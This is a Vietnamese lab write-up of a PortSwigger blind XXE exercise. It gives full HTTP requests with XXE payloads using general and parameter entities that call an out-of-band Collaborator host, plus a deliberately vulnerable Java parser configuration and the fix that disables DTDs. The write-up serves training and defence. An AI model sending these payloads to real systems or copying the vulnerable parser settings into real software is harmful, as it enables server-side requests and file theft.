![](../assets/Pasted%20image%2020261117162827.png)
# 1. Mục tiêu
Khai thác chức năng "Check stock" để tận dụng lỗ hổng Blind XXE, khác với lab trước là server đã block việc sử dụng external entity, thay vào đó phải sử dụng parameter entity.

# 2. Recon
![](../assets/Pasted%20image%2020261117163137.png)
Giống LAB01, vẫn là chức năng Check Stock để kiểm tra hàng tồn kho.
Click vào "Check stock", vào HTTP History trên Burp Suite đọc HTTP Request.
Thử sử dụng phương pháp cũ external entity.

```http
POST /product/stock HTTP/2
Host: 0ace00ae047eade580e8c66200ff00ec.web-security-academy.net
Cookie: session=3DSfb6WqRSSDP3Pu9pkVHo5SAHlLtr3V
Content-Length: 107
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: application/xml
Accept: */*
Origin: https://0ace00ae047eade580e8c66200ff00ec.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ace00ae047eade580e8c66200ff00ec.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xml_injection [<!ENTITY xxe SYSTEM "http://ntkt8dgf2cotbclx54np3m29i0oqcf.oastify.com/" >]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

![](../assets/Pasted%20image%2020261117163403.png)
Response báo lỗi do lý do bảo mật — server đã lọc/chặn general entity (`&xxe;`) ngay ở thân tài liệu.

# 3. Exploit
Sử dụng parameter entity (`%xxe;` thay cho `&xxe;`). Nhắc lại khác biệt hai loại cho dễ nhớ:

| | General `&x;` | Parameter `%x;` |
|---|---|---|
| Khai báo | `<!ENTITY xxe ...>` | `<!ENTITY % xxe ...>` |
| Tham chiếu | `&xxe;` | `%xxe;` |
| Dùng ở đâu | thân tài liệu | **chỉ trong DTD** |

Vì sao phải đổi sang parameter entity? Có **hai lý do**, lab này chạm lý do thứ nhất và chuẩn bị cho lý do thứ hai:
1. **Né bộ lọc:** general entity cần `&xxe;` nằm trong **thân** tài liệu — đúng chỗ bộ lọc hay soi. Parameter entity thì sống trong DTD, không đụng tới thân, nên lọt qua.
2. **Kỹ thuật (sẽ cần ở LAB05):** đòn exfil cần **lồng entity trong entity**. Theo luật XML, trong DTD thì `%file;` được **bung** (included in literal), còn `&file;` bị **bỏ qua** (bypassed). Chỉ parameter entity mới dựng được entity-lồng-entity trong DTD.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xml_injection [<!ENTITY % xxe SYSTEM "http://dyfh9buok1zwmsrx7ie93zfowf25qu.oastify.com/" > %xxe; ]>
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```

![](../assets/Pasted%20image%2020261117163959.png)
Response báo XML parsing error, tuy nhiên trong Burp Collaborator đã nhận được kết nối tới.
Exploit thành công. Hoàn thành lab.
(Lỗi parsing là do parser cố chèn nội dung từ URL đó vào DTD, tuy nhiên response đó không phải là cú pháp hợp lệ nên bị rơi vào câu lệnh exception trong code)
![](../assets/Pasted%20image%2020261117164141.png)![](../assets/Pasted%20image%2020261117164149.png)

# 4. Mô phỏng backend xử lý
Parser được bật **parameter entity** (`external-parameter-entities`), nên `%xxe;` trong DTD được bung và server fetch ra Collaborator ngay lúc parse. Nội dung trả về không phải DTD hợp lệ nên rơi vào nhánh `catch`, nhưng side-effect đã xảy ra xong trước đó — nên vẫn blind mà vẫn dính:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", true);
try {
    Document doc = dbf.newDocumentBuilder().parse(input);  // [1] side-effect (fetch URL) XẢY RA Ở ĐÂY
    return "\"" + checkStock(doc) + "\"";
} catch (Exception e) {
    // [2] nội dung fetch về không phải DTD hợp lệ -> lỗi parse
    //     NHƯNG fetch đã xong trước khi tới đây -> lab vẫn giải
    return "\"XML parsing error\"";                        // BLIND: không lộ thêm gì
}
```

# 5. Cách vá
```java
// Tắt DTD -> dập mọi biến thể XXE tận gốc (kể cả parameter entity)
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

Hạn chế tối đa quyền, loại bỏ tính năng resolve entities và load DTD nếu ứng dụng không dùng tới chức năng đó. Loại bỏ cả việc phản chiếu lại response ra ngoài nếu không cần thiết.